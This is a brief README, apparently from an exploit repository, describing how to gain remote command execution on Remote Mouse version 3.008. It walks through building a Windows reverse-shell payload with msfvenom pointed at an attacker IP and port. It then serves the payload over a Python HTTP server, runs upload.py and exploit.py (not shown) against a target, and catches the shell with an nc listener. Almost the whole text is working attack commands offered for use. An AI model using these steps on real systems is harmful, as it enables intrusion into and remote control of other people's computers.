<h1> Exploit for Remote Mouse - Arbitrary Remote Command Execution </h1>


<h3>specific version  3.008 </h3>


1. make revshell exe file
   
   ```
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.168.139 LPORT=443 -f exe > weinrev.exe
   ```
2. Run a python server on this directory
   ```
   python3 -m http.server 80
   ```
3. Edit upload.py at line 119 then run the command 
   ```
   python2 upload.py target_ip
   ```
4. wait a little bit for getting response in python server 
5. Run a nc for getting reverse shell
   ```
   nc -lnvp 443
   ```
6. Edit exploit.py at line 119 and run
   ```
   python2 exploit.py target_ip
   ```
